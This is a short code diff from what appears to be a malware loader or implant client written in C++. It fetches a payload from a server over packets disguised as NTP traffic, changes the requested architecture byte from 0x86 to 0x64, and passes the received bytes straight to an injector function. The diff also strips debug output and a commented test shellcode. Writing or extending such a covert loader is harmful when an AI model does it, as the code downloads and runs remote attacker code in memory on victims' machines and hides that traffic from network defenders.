@@ -118,7 +118,7 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 	//Create pcaket
 	auto packet = NTPPacket();
 	//packet.printPacket();
-	std::vector<uint8_t> packetData = { 0x86 }; //packetData on giveMePayload asks for arch?
+	std::vector<uint8_t> packetData = { 0x64 }; //packetData on giveMePayload asks for arch?
 	std::vector<uint8_t> zeroPacketData = { 0x00 }; //packetData on giveMePayload asks for arch?
 
 	// =============================================================
@@ -208,14 +208,6 @@ int main() {
 	std::vector<uint8_t> payloadBytes = getPayload(clientId);
 
 	//2. run payload
-	//bugs out here, is fine for now
-	//printHexVector(payloadBytes);
-
-	//std::vector<uint8_t> payload = { 0x90,0x90,0x90,0xc3 };
-	//auto payload_len = payload.size();
-
-	std::cout << "[?] Size of payload that's getting injected: " << payloadBytes.size() << std::endl;
-	std::cout << "[+] If you don't see 'Finished', it crashed." << std::endl;
 
 	injector(payloadBytes);
 
